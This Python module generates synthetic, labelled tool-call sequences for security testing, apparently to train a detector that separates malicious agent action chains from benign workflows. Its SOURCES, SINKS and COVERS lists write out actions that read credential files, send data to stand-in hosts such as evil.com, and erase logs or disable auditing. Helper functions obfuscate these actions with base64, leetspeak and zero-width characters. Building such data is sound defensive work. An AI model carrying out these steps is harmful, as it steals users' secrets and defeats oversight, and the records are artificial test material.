"""
synthetic_scenarios.py
======================
Generates synthetic multi-step attack scenarios for security testing.

This module produces three categories of scenarios:
  1. 200 malicious multi-step attack scenarios (SOURCE → TRANSFORM → SINK → optional COVER)
  2. 30 benign multi-step workflow scenarios (normal tool usage)
  3. 40 obfuscation-variant scenarios (kept separate from the main pool)

Every record is a dict with 7 fields:
  - action         : str   — the tool call string, e.g. "read_file('.env')"
  - label          : str   — 'malicious' only for the LAST step of attack chains; else 'benign'
  - session_id     : str   — f'synthetic-{scenario_idx}'
  - attack_type    : str   — 'malicious_multistep' | 'benign'
  - step_index     : int   — 0-based position within a session
  - source_dataset : str   — always 'synthetic'
  - augmented      : bool  — False for main scenarios, True for obfuscation variants

Public API
----------
  generate_main_scenarios()          → list[dict]   (200 attack + 30 benign)
  generate_obfuscation_variants()   → list[dict]   (40 obfuscated attack scenarios)

Reproducibility: all randomness is seeded with random.seed(42).
"""

from __future__ import annotations

import base64
import random
import string
import itertools
from typing import List, Dict, Any

# ---------------------------------------------------------------------------
# Pattern building blocks
# ---------------------------------------------------------------------------

SOURCES: List[str] = [
    "read_file('.env')",
    "read_file('/etc/passwd')",
    "get_inbox()",
    "get_contacts()",
    "list_files('/home')",
    "get_ssh_keys()",
    "read_database('users')",
    "get_api_keys()",
    "read_file('.aws/credentials')",
    "get_browser_history()",
    # Extended sources for diversity
    "read_file('/etc/shadow')",
    "read_file('~/.ssh/id_rsa')",
    "read_database('credit_cards')",
    "read_database('passwords')",
    "get_clipboard()",
    "read_file('config/secrets.yaml')",
    "get_wifi_passwords()",
    "read_file('~/.kube/config')",
    "read_file('.docker/config.json')",
    "list_files('/root')",
    "read_database('sessions')",
    "get_environment_vars()",
    "read_file('~/.gnupg/secring.gpg')",
    "read_file('/var/run/secrets/kubernetes.io/serviceaccount/token')",
    "get_keychain_items()",
    "read_file('~/.netrc')",
    "read_database('oauth_tokens')",
    "list_files('/tmp')",
    "read_file('~/.bash_history')",
    "get_process_list()",
]

TRANSFORMS: List[str] = [
    "base64_encode(data)",
    "compress(content, 'gz')",
    "json.dumps(secrets)",
    "encrypt(data, key)",
    "hex_encode(payload)",
    "url_encode(content)",
    "split_chunks(data, 1024)",
    "serialize(obj)",
    "tar_archive(files)",
    "encode_utf16(text)",
    # Extended transforms for diversity
    "xor_cipher(data, 0xAA)",
    "rot13(text)",
    "zlib_compress(data)",
    "msgpack_encode(obj)",
    "pickle_dumps(data)",
    "aes_encrypt(data, secret_key)",
    "lzma_compress(payload)",
    "base85_encode(content)",
    "brotli_compress(data)",
    "protobuf_serialize(message)",
    "chunk_and_pad(data, 512)",
    "steganography_embed(image, data)",
    "rsa_encrypt(data, pub_key)",
    "bencode(data)",
    "cbor_encode(obj)",
]

SINKS: List[str] = [
    "http_post('evil.com/collect', body)",
    "send_email('attacker@evil.com', data)",
    "upload_s3('exfil-bucket', file)",
    "dns_exfil('data.evil.com', encoded)",
    "ftp_upload('ftp.evil.com', payload)",
    "webhook_post('https://hook.evil.com', data)",
    "write_file('/tmp/.hidden', data)",
    "curl('https://evil.com/api', data)",
    "send_sms('+1234567890', encoded)",
    "irc_send('irc.evil.net', '#channel', data)",
    # Extended sinks for diversity
    "http_post('c2.darkweb.onion/exfil', body)",
    "upload_gcs('stolen-data-bucket', file)",
    "mqtt_publish('broker.evil.com', 'exfil/topic', data)",
    "websocket_send('ws://evil.com/ws', data)",
    "slack_webhook('https://hooks.slack.com/TXXXXXX', data)",
    "telegram_send('bot_token', 'chat_id', data)",
    "pastebin_post('api_key', content)",
    "dropbox_upload('/exfil/', file)",
    "discord_webhook('https://discord.com/api/webhooks/XXX', data)",
    "scp_upload('attacker@evil.com:/loot/', file)",
    "rsync_send('evil.com::exfil', data)",
    "tcp_send('evil.com', 4444, payload)",
    "udp_send('evil.com', 5353, encoded)",
    "icmp_tunnel('evil.com', data)",
    "http_put('https://evil.com/store', body)",
]

COVERS: List[str] = [
    "history_clear()",
    "rm_file('~/.bash_history')",
    "truncate_file('/var/log/auth.log')",
    "clear_logs()",
    "modify_timestamp('/tmp/.hidden')",
    "delete_file('/tmp/exfil.tar.gz')",
    "reset_permissions()",
    "remove_cron_entry('exfil-job')",
    # Extended covers for diversity
    "overwrite_syslog()",
    "rm_file('/var/log/syslog')",
    "shred_file('/tmp/.cache_data')",
    "disable_audit()",
    "clear_wtmp()",
    "modify_timestamp('/var/log/auth.log')",
    "unset_env('HISTFILE')",
    "kill_process('sysmon')",
    "iptables_flush()",
    "rm_file('/tmp/.hidden')",
    "clear_journal()",
    "remove_cron_entry('data-sync')",
]

# ---------------------------------------------------------------------------
# Benign workflow building blocks
# ---------------------------------------------------------------------------

BENIGN_WORKFLOWS: List[List[str]] = [
    # Data analysis workflows
    ["read_file('data/sales_q4.csv')", "parse_csv(content)", "aggregate(records, 'revenue')", "write_file('reports/q4_summary.csv', result)"],
    ["read_file('logs/access.log')", "parse_log_entries(content)", "filter_by_date(entries, '2025-01-01')", "write_file('reports/access_summary.txt', filtered)"],
    ["read_database('products')", "json.dumps(products)", "write_file('exports/products.json', data)", "send_email('team@company.com', 'Export ready')"],
    ["list_files('src/')", "count_lines_of_code(files)", "generate_report(stats)", "write_file('docs/loc_report.md', report)"],
    ["read_file('config/app.yaml')", "validate_config(content)", "merge_defaults(config, defaults)", "write_file('config/app_resolved.yaml', merged)"],

    # DevOps workflows
    ["read_file('docker-compose.yml')", "validate_compose(content)", "build_images(services)", "deploy_stack(stack_name, config)"],
    ["read_file('terraform/main.tf')", "terraform_plan(config)", "review_changes(plan)", "terraform_apply(plan)"],
    ["list_files('migrations/')", "sort_by_version(files)", "run_migrations(sorted_files)", "send_email('devops@company.com', 'Migrations complete')"],
    ["read_database('deployments')", "check_health(services)", "generate_status_page(health)", "write_file('public/status.html', page)"],
    ["read_file('k8s/deployment.yaml')", "kubectl_apply(manifest)", "wait_for_rollout('my-app')", "notify_slack('#deployments', 'Rollout complete')"],

    # Communication workflows
    ["get_inbox()", "filter_unread(emails)", "summarize(unread)", "send_email('manager@company.com', summary)"],
    ["get_contacts()", "filter_by_group(contacts, 'clients')", "compose_newsletter(clients, template)", "send_bulk_email(newsletter)"],
    ["read_file('templates/report.html')", "render_template(template, data)", "convert_to_pdf(html)", "send_email('client@partner.com', pdf)"],
    ["get_inbox()", "extract_action_items(emails)", "create_tasks(items)", "sync_to_jira(tasks)"],
    ["read_file('meeting_notes.md')", "extract_decisions(notes)", "format_summary(decisions)", "post_to_confluence(summary)"],

    # File management workflows
    ["list_files('uploads/')", "validate_files(files)", "move_to_archive(validated)", "update_inventory(archive_records)"],
    ["read_file('data/raw_input.json')", "clean_data(raw)", "transform_schema(cleaned)", "write_file('data/processed.json', transformed)"],
    ["list_files('backups/')", "filter_older_than(files, '30d')", "compress(old_files, 'tar.gz')", "upload_s3('company-backups', archive)"],
    ["read_file('README.md')", "check_broken_links(content)", "fix_links(content, corrections)", "write_file('README.md', fixed)"],
    ["list_files('photos/')", "resize_images(files, 800, 600)", "optimize_compression(resized)", "write_file('thumbnails/', optimized)"],

    # Monitoring / analytics workflows
    ["read_database('metrics')", "calculate_averages(metrics, 'hourly')", "plot_chart(averages)", "write_file('dashboards/perf.png', chart)"],
    ["read_file('logs/error.log')", "parse_errors(content)", "group_by_type(errors)", "create_jira_tickets(grouped)"],
    ["read_database('users')", "calculate_churn(users)", "generate_report(churn_data)", "send_email('analytics@company.com', report)"],
    ["read_file('data/survey_responses.csv')", "parse_csv(content)", "sentiment_analysis(responses)", "write_file('reports/sentiment.json', results)"],
    ["read_database('orders')", "compute_revenue(orders, 'monthly')", "format_table(revenue)", "post_to_slack('#finance', table)"],

    # Security (benign) workflows
    ["list_files('certs/')", "check_expiry(certs)", "generate_renewal_requests(expiring)", "send_email('security@company.com', requests)"],
    ["read_file('config/firewall_rules.json')", "validate_rules(rules)", "diff_with_baseline(rules, baseline)", "write_file('reports/firewall_audit.md', diff)"],
    ["read_database('audit_log')", "filter_by_severity(logs, 'high')", "generate_alert(critical_logs)", "send_email('soc@company.com', alert)"],
    ["read_file('requirements.txt')", "check_vulnerabilities(deps)", "generate_patch_plan(vulns)", "write_file('security/patch_plan.md', plan)"],
    ["list_files('src/')", "run_sast_scan(files)", "parse_findings(results)", "create_jira_tickets(findings)"],
]

# ---------------------------------------------------------------------------
# Helper – record factory
# ---------------------------------------------------------------------------

def _make_record(
    action: str,
    label: str,
    session_id: str,
    attack_type: str,
    step_index: int,
    augmented: bool = False,
) -> Dict[str, Any]:
    """Create a single scenario record with all 7 required fields."""
    return {
        "action": action,
        "label": label,
        "session_id": session_id,
        "attack_type": attack_type,
        "step_index": step_index,
        "source_dataset": "synthetic",
        "augmented": augmented,
    }


# ---------------------------------------------------------------------------
# Attack-chain builder
# ---------------------------------------------------------------------------

def _build_attack_chain(rng: random.Random) -> List[str]:
    """
    Build a single 4-6 step attack chain:
      SOURCE → [optional extra SOURCE] → TRANSFORM → [optional extra TRANSFORM] → SINK → [optional COVER]

    Returns a list of action strings (4-6 items).
    """
    num_steps = rng.randint(4, 6)

    # Always start with 1 source
    chain: List[str] = [rng.choice(SOURCES)]

    # Decide how many of each phase to add based on target length
    remaining = num_steps - 2  # at least 1 source (done) + 1 sink (will add)

    # Possibly add a second source (recon / multi-target harvest)
    if remaining > 1 and rng.random() < 0.35:
        second_source = rng.choice([s for s in SOURCES if s != chain[0]])
        chain.append(second_source)
        remaining -= 1

    # Add transforms — at least 1, possibly 2
    num_transforms = min(remaining - 0, rng.randint(1, min(2, remaining)))
    # If remaining only allows for sink + cover, clamp
    if remaining - num_transforms < 1:
        num_transforms = remaining - 1
    transforms_picked = rng.sample(TRANSFORMS, k=num_transforms)
    chain.extend(transforms_picked)
    remaining -= num_transforms

    # Always add exactly 1 sink
    chain.append(rng.choice(SINKS))
    remaining -= 1

    # If there's room left, add a cover step
    if remaining > 0:
        chain.append(rng.choice(COVERS))

    return chain


# ---------------------------------------------------------------------------
# Obfuscation techniques
# ---------------------------------------------------------------------------

_LEET_MAP = str.maketrans({
    'a': '4', 'A': '4',
    'e': '3', 'E': '3',
    'i': '1', 'I': '1',
    'o': '0', 'O': '0',
    's': '5', 'S': '5',
    't': '7', 'T': '7',
})

_ZWSP = '\u200b'  # zero-width space
_ZWJ  = '\u200d'  # zero-width joiner
_ZWNJ = '\u200c'  # zero-width non-joiner
_ZW_CHARS = [_ZWSP, _ZWJ, _ZWNJ]


def _obfuscate_base64(action: str, rng: random.Random) -> str:
    """Wrap string arguments inside base64-encoded payloads."""
    # Find the first quoted string and base64-encode its content
    import re
    def _encode_match(m: re.Match) -> str:
        quote = m.group(0)[0]
        inner = m.group(1) or m.group(2)
        encoded = base64.b64encode(inner.encode()).decode()
        return f"b64decode({quote}{encoded}{quote})"
    return re.sub(r"'([^']+)'|\"([^\"]+)\"", _encode_match, action, count=1)


def _obfuscate_leet(action: str, _rng: random.Random) -> str:
    """Apply leet speak substitutions to the action string."""
    return action.translate(_LEET_MAP)


def _obfuscate_zero_width(action: str, rng: random.Random) -> str:
    """Insert zero-width characters between random character positions."""
    result: List[str] = []
    for ch in action:
        result.append(ch)
        if ch.isalpha() and rng.random() < 0.25:
            result.append(rng.choice(_ZW_CHARS))
    return ''.join(result)


def _obfuscate_varnames(action: str, rng: random.Random) -> str:
    """Replace descriptive variable references with random short names."""
    import re
    replacements = {
        'data': f'_{rng.choice(string.ascii_lowercase)}{rng.randint(0,99):02d}',
        'content': f'_x{rng.randint(100,999)}',
        'payload': f'_buf{rng.randint(0,9)}',
        'body': f'_b{rng.randint(10,99)}',
        'file': f'_f{rng.randint(0,9)}',
        'encoded': f'_enc{rng.randint(0,9)}',
        'secrets': f'_s{rng.randint(10,99)}',
        'text': f'_t{rng.randint(0,99):02d}',
        'obj': f'_o{rng.randint(0,9)}',
        'files': f'_fs{rng.randint(0,9)}',
        'key': f'_k{rng.randint(0,9)}',
        'result': f'_r{rng.randint(0,99):02d}',
    }
    obfuscated = action
    for original, replacement in replacements.items():
        # Only replace bare variable references (not inside quoted strings)
        obfuscated = re.sub(
            rf'(?<=[,()\s])({re.escape(original)})(?=[,)\s])',
            replacement,
            obfuscated,
        )
    return obfuscated


def _obfuscate_concat(action: str, rng: random.Random) -> str:
    """Split domain / path strings using concatenation."""
    import re
    def _split_string(m: re.Match) -> str:
        quote = m.group(0)[0]
        inner = m.group(1) or m.group(2)
        if len(inner) < 6:
            return m.group(0)
        # Pick a random split point
        split_at = rng.randint(2, len(inner) - 2)
        left, right = inner[:split_at], inner[split_at:]
        return f"{quote}{left}{quote} + {quote}{right}{quote}"
    return re.sub(r"'([^']{6,})'|\"([^\"]{6,})\"", _split_string, action, count=1)


_OBFUSCATION_FNS = [
    _obfuscate_base64,
    _obfuscate_leet,
    _obfuscate_zero_width,
    _obfuscate_varnames,
    _obfuscate_concat,
]

# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate_main_scenarios() -> List[Dict[str, Any]]:
    """
    Generate the main pool of scenarios.

    Returns
    -------
    list[dict]
        A flat list of step-records comprising:
          • 200 malicious multi-step attack scenarios
          • 30 benign multi-step workflow scenarios
        Each record contains all 7 required fields.
        Only the **last** step of each attack scenario is labelled 'malicious';
        all preceding steps (and all benign steps) are labelled 'benign'.
    """
    rng = random.Random(42)
    records: List[Dict[str, Any]] = []
    scenario_idx = 0

    # ------------------------------------------------------------------
    # 200 attack scenarios
    # ------------------------------------------------------------------
    for _ in range(200):
        chain = _build_attack_chain(rng)
        session_id = f"synthetic-{scenario_idx}"

        for step_i, action in enumerate(chain):
            is_last = (step_i == len(chain) - 1)
            records.append(
                _make_record(
                    action=action,
                    label='malicious' if is_last else 'benign',
                    session_id=session_id,
                    attack_type='malicious_multistep',
                    step_index=step_i,
                    augmented=False,
                )
            )
        scenario_idx += 1

    # ------------------------------------------------------------------
    # 30 benign scenarios
    # ------------------------------------------------------------------
    # Cycle through the predefined benign workflows and pick 30
    benign_pool = list(BENIGN_WORKFLOWS)
    rng.shuffle(benign_pool)
    # If we have fewer than 30 unique workflows, repeat some with slight variation
    selected_benign = (benign_pool * 2)[:30]

    for workflow in selected_benign:
        session_id = f"synthetic-{scenario_idx}"
        for step_i, action in enumerate(workflow):
            records.append(
                _make_record(
                    action=action,
                    label='benign',
                    session_id=session_id,
                    attack_type='benign',
                    step_index=step_i,
                    augmented=False,
                )
            )
        scenario_idx += 1

    return records


def generate_obfuscation_variants() -> List[Dict[str, Any]]:
    """
    Generate 40 obfuscated attack scenarios.

    These are derived from fresh random attack chains (same distribution as
    the main pool) but with one of five obfuscation techniques applied to
    every action string.  Each scenario is assigned a *different* session_id
    range (starting at 'synthetic-1000') so they can never collide with the
    main pool.

    Obfuscation techniques (cycled evenly — 8 scenarios each):
      1. Base64-encoded payloads in action strings
      2. Leet speak substitutions  (a→4, e→3, i→1, o→0, s→5, t→7)
      3. Zero-width characters inserted between letters
      4. Variable-name obfuscation (random short names)
      5. String-concatenation splitting ('ev'+'il.com')

    Returns
    -------
    list[dict]
        A flat list of step-records for 40 scenarios, all with augmented=True.
    """
    rng = random.Random(42_42)   # different seed keeps variants independent
    records: List[Dict[str, Any]] = []
    scenario_idx = 1000  # separate ID space

    # Cycle through the 5 techniques evenly: 8 scenarios each = 40 total
    technique_cycle = itertools.cycle(_OBFUSCATION_FNS)

    for i in range(40):
        obfuscate = next(technique_cycle)
        chain = _build_attack_chain(rng)
        session_id = f"synthetic-{scenario_idx}"

        for step_i, action in enumerate(chain):
            is_last = (step_i == len(chain) - 1)
            records.append(
                _make_record(
                    action=obfuscate(action, rng),
                    label='malicious' if is_last else 'benign',
                    session_id=session_id,
                    attack_type='malicious_multistep',
                    step_index=step_i,
                    augmented=True,
                )
            )
        scenario_idx += 1

    return records


# ---------------------------------------------------------------------------
# Quick self-test / summary when run directly
# ---------------------------------------------------------------------------

def _print_summary() -> None:
    """Print a concise summary of the generated datasets."""
    main = generate_main_scenarios()
    obfs = generate_obfuscation_variants()

    # Count scenarios by session_id
    main_sessions = set(r['session_id'] for r in main)
    obfs_sessions = set(r['session_id'] for r in obfs)

    attack_sessions = [s for s in main_sessions if any(
        r['attack_type'] == 'malicious_multistep' for r in main if r['session_id'] == s
    )]
    benign_sessions = [s for s in main_sessions if any(
        r['attack_type'] == 'benign' for r in main if r['session_id'] == s
    )]

    print("=" * 65)
    print("  Synthetic Scenario Generation — Summary")
    print("=" * 65)
    print(f"  Main pool total records  : {len(main)}")
    print(f"    Attack scenarios       : {len(attack_sessions)}")
    print(f"    Benign scenarios       : {len(benign_sessions)}")
    print(f"  Obfuscation variants     : {len(obfs)} records across {len(obfs_sessions)} scenarios")
    print()

    # Label distribution
    main_labels = {}
    for r in main:
        main_labels[r['label']] = main_labels.get(r['label'], 0) + 1
    print("  Main pool label distribution:")
    for lbl, cnt in sorted(main_labels.items()):
        print(f"    {lbl:12s}: {cnt}")

    obfs_labels = {}
    for r in obfs:
        obfs_labels[r['label']] = obfs_labels.get(r['label'], 0) + 1
    print("  Obfuscation label distribution:")
    for lbl, cnt in sorted(obfs_labels.items()):
        print(f"    {lbl:12s}: {cnt}")

    # Step-count distribution for attack scenarios
    from collections import Counter
    attack_step_counts = Counter()
    for sid in attack_sessions:
        steps = [r for r in main if r['session_id'] == sid]
        attack_step_counts[len(steps)] += 1
    print()
    print("  Attack chain length distribution:")
    for length in sorted(attack_step_counts):
        print(f"    {length} steps: {attack_step_counts[length]} scenarios")

    # Sample records
    print()
    print("-" * 65)
    print("  Sample attack scenario (first):")
    print("-" * 65)
    first_attack_sid = f"synthetic-0"
    for r in main:
        if r['session_id'] == first_attack_sid:
            print(f"    step {r['step_index']}: [{r['label']:9s}] {r['action']}")

    print()
    print("-" * 65)
    print("  Sample benign scenario (first):")
    print("-" * 65)
    first_benign_sid = None
    for r in main:
        if r['attack_type'] == 'benign':
            first_benign_sid = r['session_id']
            break
    if first_benign_sid:
        for r in main:
            if r['session_id'] == first_benign_sid:
                print(f"    step {r['step_index']}: [{r['label']:9s}] {r['action']}")

    print()
    print("-" * 65)
    print("  Sample obfuscation variants (one per technique):")
    print("-" * 65)
    shown_sessions = set()
    for r in obfs:
        if r['session_id'] not in shown_sessions and r['step_index'] == 0:
            shown_sessions.add(r['session_id'])
            variant_steps = [v for v in obfs if v['session_id'] == r['session_id']]
            technique_idx = (int(r['session_id'].split('-')[1]) - 1000) % 5
            technique_names = ['base64', 'leet', 'zero-width', 'varname', 'concat']
            print(f"  [{technique_names[technique_idx]}] session {r['session_id']}:")
            for v in variant_steps:
                print(f"    step {v['step_index']}: [{v['label']:9s}] {repr(v['action'])}")
            print()
            if len(shown_sessions) >= 5:
                break

    print("=" * 65)
    print("  [OK] All scenarios generated successfully.")
    print("=" * 65)


if __name__ == "__main__":
    _print_summary()
